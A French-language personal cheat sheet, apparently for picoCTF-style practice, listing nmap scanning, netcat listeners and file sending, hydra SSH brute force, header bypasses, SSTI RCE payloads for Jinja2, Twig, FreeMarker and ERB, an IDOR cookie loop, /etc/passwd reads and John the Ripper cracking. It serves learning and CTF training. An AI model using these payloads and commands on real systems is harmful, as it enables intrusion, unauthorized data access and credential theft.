# Ma Cheat Sheet - Réseau & Nmap

## Découverte 
| Commande | Description | Exemple |
| :--- | :--- | :--- |
| `ip a` | Afficher ma propre adresse IP (Kali). | |
| `nmap -sn [IP/24]` | **Ping Scan**. Scanne tout le réseau pour voir qui est en ligne (sans scanner les ports). | `nmap -sn 192.168.1.0/24` |

## Scan de Ports
| Commande | Description | Exemple |
| :--- | :--- | :--- |
| `nmap [IP]` | Scan simple (1000 ports les plus courants). | `nmap 192.168.1.50` |
| `nmap -p- [IP]` | **Scan complet**. Vérifie les 65 535 ports (long mais précis). | `nmap -p- 192.168.1.50` |
| `nmap -p [PORT] [IP]` | Scan chirurgical. Vérifie un ou plusieurs ports précis. | `nmap -p 80,443 192.168.1.50` |
| `nmap -A [IP]` | **Scan Agressif**. Détecte l'OS et les versions des services. | `nmap -A scanme.nmap.org` |

## Options Utiles
| Option | Effet |
| :--- | :--- |
| `-v` | **Verbose**. Nmap parle en temps réel (ne reste pas muet). |
| `-Pn` | Force le scan même si la cible bloque le ping (utile pour Windows). |
| `-oN [fichier]` | **Sauvegarde**. Enregistre le résultat dans un fichier texte. |

## Outils Python & Netcat

| Commande | Description | Exemple |
| :--- | :--- | :--- |
| `python3 -m http.server 8000` | Transforme le dossier actuel en serveur Web instantané. | `python3 -m http.server 8000` |
| `nc -v [IP] [PORT]` | **Netcat**. Se connecte manuellement à un port pour voir la bannière. | `nc -v 127.0.0.1 22` |
| `nc -lvp [port]` | **Mode Serveur**. Crée un "Listener" qui attend une connexion. | `nc -lvp 4444` |
| `nc -lvp [port] \| hd` | Écoute et affiche les données en Hexadécimal. | `nc -lvp 4444 \| hd` |
| `nc -lvp [port] > [fichier]` | **Recevoir un fichier**. Écoute et enregistre tout ce qui arrive dans un fichier. | `nc -lvp 4444 > butin.txt` |
| `nc [IP] [port] < [fichier]` | **Envoyer un fichier**. Connecte et expédie le contenu d'un fichier. | `nc 192.168.1.50 4444 < secret.txt` |
| `python3 -c "print(''.join([chr(int(x)) for x in open('file.txt').read().split()]))"` | **Décodeur ASCII**. Convertit un fichier de nombres décimaux en texte. |`python3 -c "print(''.join([chr(int(x)) for x in open('capture.txt').read().split()]))"`|
| `awk '{for(i=1;i<=NF;i++) printf "%c", $i; print ""}' [file]` | **Décodeur Rapide**. Alternative Linux pour transformer le décimal en texte. | `awk ... capture.txt` |
| `strings [fichier]` | **Nettoyeur**. Extrait uniquement le texte lisible d'un fichier binaire. | `strings capture.txt` |


## Gestion des Services (SSH)

| Commande | Description | Exemple |
| :--- | :--- | :--- |
| `sudo systemctl status ssh` | Vérifie si le serveur SSH est allumé ou éteint. | `sudo systemctl status ssh` |
| `sudo systemctl start ssh` | Allume le service SSH pour autoriser les connexions. | `sudo systemctl start ssh` |
| `sudo systemctl stop ssh` | Éteint le service SSH (Sécurité après utilisation). | `sudo systemctl stop ssh` |
| `ssh [user]@[IP]` | Se connecte à une machine distante via un tunnel chiffré. | `ssh kali@127.0.0.1` |
| `ssh [user]@[IP] -p [port]` | **Connexion Port Spécifique**. Se connecte si le port n'est pas le 22. | `ssh ctf-player@titan.picoctf.net -p 58704` |
| `who` | Affiche les utilisateurs connectés et leur provenance. | `who` |
| `sudo journalctl -t sshd -n 20` | **Logs SSH**. Affiche les 20 dernières tentatives de connexion au serveur. | `sudo journalctl -t sshd -n 20` |

## Pare-feu (UFW)

| Commande | Description | Exemple |
| :--- | :--- | :--- |
| `sudo apt install ufw` | Installe le pare-feu (si non présent). | `sudo apt install ufw` |
| `sudo ufw status` | Vérifie si le pare-feu est actif et liste les règles. | `sudo ufw status` |
| `sudo ufw allow [service]` | Autorise le trafic entrant pour un service ou un port. | `sudo ufw allow ssh` |
| `sudo ufw enable` | Active le pare-feu (Attention à ne pas s'enfermer dehors !). | `sudo ufw enable` |
| `sudo ufw disable` | Désactive le pare-feu (Laisse tout passer). | `sudo ufw disable` |

## Force Brute & Wordlists

| Commande | Description | Exemple |
| :--- | :--- | :--- |
| `gunzip [fichier.gz]` | **Décompression**. Extrait les listes de mots (ex: RockYou). | `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` |
| `echo -e "p1\np2" > [file]` | **Création de liste**. Crée un fichier avec un mot de passe par ligne. | `echo -e "123\nmotdepasse" > pass.txt` |
| `hydra -l [user] -P [file] ssh://[IP]` | **Attaque SSH**. Tente de forcer l'accès avec une liste de mots de passe. | `hydra -l kali -P pass.txt ssh://127.0.0.1` |


## Web : Headers & Décodage (Bypass)

| Commande | Description | Exemple |
| :--- | :--- | :--- |
| `echo "[texte]" \| tr 'A-Za-z' 'N-ZA-Mn-za-m'` | **Décodeur ROT13**. Pour les indices cachés (ex: `Wnpx` -> `Jack`). | `echo "K-Qri-Npprff" \| tr...` |
| `curl -H "[Header]: [Value]" [URL]` | **Bypass Header (Terminal)**. Injecte un en-tête pour forcer l'accès. | `curl -H "X-Dev-Access: yes" [URL]` |
| **F12 > Network > Edit & Resend** | **Bypass Header (Firefox)**. Ajouter manuellement le header décodé. | Ajouter `X-Dev-Access: yes` |

> **Règle d'or :** Si le serveur répond **200 OK** mais que rien ne change sur la page, le flag est dans l'onglet **Response** de l'inspecteur réseau.

---
## SSTI : Identification & Exploitation (Multi-Langages)

Le succès d'une injection dépend du langage utilisé par le serveur. Toujours suivre l'ordre : **Détection** > **Identification** > **Exploitation**.

### 1. Identification du Moteur (Détection)

| Payload | Jinja2 (Python) | Twig (PHP) | Mako (Python) |
| :--- | :--- | :--- | :--- |
| `{{ 7*7 }}` | **49** | **49** | `{{ 7*7 }}` |
| `{{ 7*'7' }}` | **7777777** | Erreur / 49 | `{{ 7*'7' }}` |
| `${7*7}` | `${7*7}` | `${7*7}` | **49** |

**Syntaxes Spécifiques :**
* **Ruby (ERB)** : `<%= 7*7 %>`
* **Java (FreeMarker)** : `${7*7}`
* **JavaScript (Pug)** : `#{7*7}`
* **ASP.NET (Razor)** : `@(7*7)`

> **Règle d'or :** Si `{{ 7*7 }}` affiche `49`, testez `{{ 7*'7' }}`. Si ça affiche `7777777`, vous êtes sûr à 100% d'être sur du **Python/Jinja2**.

---

### 2. Reconnaissance Avancée (Objets Internes)
*Une fois le moteur identifié, on cherche à voir ce qui est accessible avant de tenter le RCE.*

| Langage | Payload d'Introspection | Ce qu'on cherche |
| :--- | :--- | :--- |
| **Python (Jinja2)** | `{{ config.items() }}` | `SECRET_KEY`, Database URIs. |
| **Python (Jinja2)** | `{{ [].__class__.__base__.__subclasses__() }}` | L'index de `os._wrap_close` ou `subprocess.Popen`. |
| **PHP (Twig)** | `{{ _self }}` | L'objet template actuel. |
| **PHP (Twig)** | `{{ _context }}` | Les variables disponibles (username, flag path...). |
| **Java** | `${.data_model}` | Les objets exposés par l'application. |

---

### 3. Exploitation (RCE - Remote Code Execution)
*L'objectif est d'exécuter `ls` (lister) puis `cat` (lire).*

#### A. Python (Jinja2 / Flask)
| Objectif | Payload |
| :--- | :--- |
| **Tester la RCE (ls)** | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}` |
| **Lire le Flag (cat)** | `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}` |
| **Via Index précis** | `{{ [].__class__.__base__.__subclasses__()[INDEX].__init__.__globals__['os'].popen('ls').read() }}` |

> **Note Debug :** Si l'index renvoie **Error 500**, utilisez le payload **Universel** (le premier).

#### B. PHP (Twig)
| Objectif | Payload |
| :--- | :--- |
| **RCE (ls)** | `{{['ls']\|filter('system')}}` |
| **RCE (cat)** | `{{['cat flag.txt']\|filter('system')}}` |
| **Lecture Fichier** | `{{'/etc/passwd'\|file_excerpt(1,30)}}` (Si `system` est bloqué) |

#### C. Java (FreeMarker)
| Objectif | Payload |
| :--- | :--- |
| **RCE (ls)** | `${new freemarker.template.utility.Execute().exec("ls")}` |
| **RCE (cat)** | `${new freemarker.template.utility.Execute().exec("cat flag.txt")}` |

#### D. Ruby (ERB)
| Objectif | Payload |
| :--- | :--- |
| **RCE (ls)** | `<%= %x(ls) %>` |
| **RCE (cat)** | `<%= %x(cat flag.txt) %>` |


## Reconnaissance & Énumération Web

| Commande | Description | Exemple |
| :--- | :--- | :--- |
| `gobuster dir -u [URL] -w [wordlist]` | **Brute-force de dossiers**. Trouve les pages cachées sur un serveur. | `gobuster dir -u http://site.com -w /usr/share/wordlists/dirb/common.txt` |
| `gobuster dir -u [URL] -w [list] -x php,txt` | **Recherche d'extensions**. Cherche des fichiers spécifiques (`.txt`, `.php`, `.bak`). | `gobuster ... -x txt,php,bak` |
| `dirb [URL]` | **Scan récursif**. Scanne le site et entre automatiquement dans tous les sous-dossiers trouvés. | `dirb http://site.com` |

---

## Analyse de Fichiers & Mémoire (Forensics)

*Techniques pour extraire des secrets d'un fichier binaire, d'un dump mémoire (.dump) ou d'un snapshot (.heapsnapshot).*

| Commande | Description | Exemple |
| :--- | :--- | :--- |
| `strings [fichier]` | **Extraction de texte**. Affiche tout le texte lisible caché dans un fichier binaire. | `strings heap.heapsnapshot` |
| `strings [fichier] \| grep "pico"` | **Filtrage**. Ne garde que les lignes contenant un mot-clé précis (ex: "pico"). | `strings memory.bin \| grep "picoCTF"` |
| `grep -aoE "picoCTF\{.*\}" [file]` | **Extraction Regex**. Trouve et affiche uniquement le flag dans un binaire (`-a` pour binaire). | `grep -aoE "picoCTF\{[^\}]+\}" dump.snapshot` |

> ** Leçon apprise :** Si un développeur oublie un endpoint de "Debug" (comme une documentation API ou une console), on peut récupérer un **Heap Dump**. Ce fichier contient l'état de la RAM du serveur, permettant de lire des variables sensibles (flags, mots de passe) qui ne sont pas dans le code source.

## Décodage de Cookies & Chaînes Web

Souvent, les flags ou les sessions sont cachés derrière plusieurs couches d'encodage.

### 1. Identifier l'URL Encoding
* **Signe :** Présence de `%3D`, `%20`, `%2F`, etc.
* **Action :** Utiliser un outil en ligne ou `CyberChef`. `%3D%3D` devient `==`.

### 2. Décoder le Base64 (Kali Linux)
Une fois les caractères spéciaux nettoyés, on utilise le terminal :
```bash
echo "cGljb...==" | base64 -d
```

## Manipulation de Cookies : IDOR Simple

Lorsqu'un site utilise un cookie avec une valeur numérique simple (ex: `id=1`), il est possible de tester d'autres valeurs pour accéder à des données non autorisées.

### Automatisation avec Curl
Si une ressource change en fonction d'un cookie, on peut "brute-forcer" les valeurs :

```bash
# Boucle pour tester les valeurs de cookie de 0 à 50
for i in {0..50}; do
    curl -s -b "cookie_name=$i" [URL] | grep "picoCTF"
done
```
# Exploitation Web : Méthodes HTTP & Énumération

## 1. Les Méthodes HTTP (Verbes)
Au-delà de GET et POST, un serveur peut accepter d'autres commandes. Tester ces verbes permet de contourner des restrictions.

| Méthode | Rôle | Intérêt en Cybersécurité |
| :--- | :--- | :--- |
| **GET** | Récupérer une page | Paramètres visibles dans l'URL. |
| **POST** | Envoyer des données | Paramètres cachés dans le corps (Body). |
| **HEAD** | Headers uniquement | Chercher des drapeaux (flags) dans les en-têtes. |
| **OPTIONS** | Lister les méthodes | Voir ce que le serveur autorise (ex: Allow: PUT). |
| **PUT** | Créer/Modifier | Tenter d'uploader un fichier ou d'écraser une page. |
| **DELETE** | Supprimer | Tenter de supprimer des fichiers sensibles. |

---

## 2. Utilisation Avancée de Burp Suite

### Le cycle de modification (Repeater)
1. Capturer la requête dans l'onglet **Proxy** (`Intercept ON`).
2. Envoyer au **Repeater** avec `Ctrl + R`.
3. Modifier la méthode (ex: changer `GET` en `PUT` sur la ligne 1).
4. Ajouter des paramètres manuellement si nécessaire (ex: `?admin=1`).
5. Cliquer sur **Send** et analyser la réponse (onglet **Render** pour le visuel).

### Astuce : Le "Verb Tampering"
Si un accès est refusé en `GET` (Erreur 403), changez la méthode en `POST` ou `PUT`. Certains serveurs mal configurés ne protègent que la méthode par défaut.

---

## 3. Énumération de fichiers critiques

Lorsqu'un indice mentionne un environnement spécifique (Mac, Apache), il faut tester l'accès aux fichiers système cachés.

### Serveur Apache
* **`/.htaccess`** : Fichier de configuration local. Peut révéler des dossiers protégés.
* **`/.htpasswd`** : Contient des identifiants (hashs) si le dossier est protégé par mot de passe.

### Environnement Mac (macOS)
* **`/.DS_Store`** : Fichier créé automatiquement par Mac. Il contient la liste des fichiers du répertoire.
* **Comment l'exploiter ?**
  1. Télécharger le fichier : `curl -O http://cible.com/.DS_Store`
  2. Lire le contenu sur Kali : `strings .DS_Store`
  3. Chercher des noms de fichiers cachés dans la sortie de la commande.

---

## 4. Sécurité Défensive (Anti-Indexing)
Comment un administrateur tente (souvent mal) de se cacher :
1. **Robots.txt** : `Disallow: /` (Consigne pour les robots, mais indice pour les hackers).
2. **Balise Meta** : `<meta name="robots" content="noindex">` (Cache du moteur de recherche, pas de l'humain).
3. **X-Robots-Tag** : Header HTTP envoyé par le serveur pour bloquer l'indexation de tout type de fichier.

# CRYPTOGRAPHIE & PASSWORD CRACKING

## Méthodologie
1. **Identifier** : `hashid [HASH]`
2. **Préparer** : `echo "[HASH]" > hash.txt`
3. **Attaquer** : `john --format=[FORMAT] --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
4. **Voir** : `john --show --format=[FORMAT] hash.txt`

## Formats John the Ripper (`--format=`)
| Algorithme | Format John | Note |
| :--- | :--- | :--- |
| **MD5** (32 chars) | `Raw-MD5` | Très rapide. |
| **SHA-1** (40 chars) | `Raw-SHA1` | Standard ancien. |
| **SHA-256** (64 chars) | `Raw-SHA256` | Standard actuel. |
| **Snefru** (64 chars) | `Snefru-256` | Ancien, souvent un piège en CTF (confondu avec SHA-256). |
| **NTLM** | `NT` | Hash Windows. |

## Dépannage John
* **"Incremental"** : Vous avez oublié la wordlist. Faites Ctrl+C et ajoutez `--wordlist=...`.
* **"0g 0:00:00 DONE"** : Mot de passe pas dans la liste OU mauvais format (ex: Snefru vs SHA).
* **"No password hashes left"** : Déjà craqué. Utilisez `--show`.

---
# FORENSICS (ANALYSE DE FICHIERS)

| Commande | Description |
| :--- | :--- |
| `strings [fichier]` | Extrait tout le texte lisible d'un fichier binaire/image. |
| `grep -a "flag" [fichier]` | Cherche un mot précis dans un binaire. |
| `binwalk -e [fichier]` | Extrait les fichiers cachés à l'intérieur d'un autre fichier. |
| `exiftool [image]` | Affiche les métadonnées (GPS, Auteur, Date). |
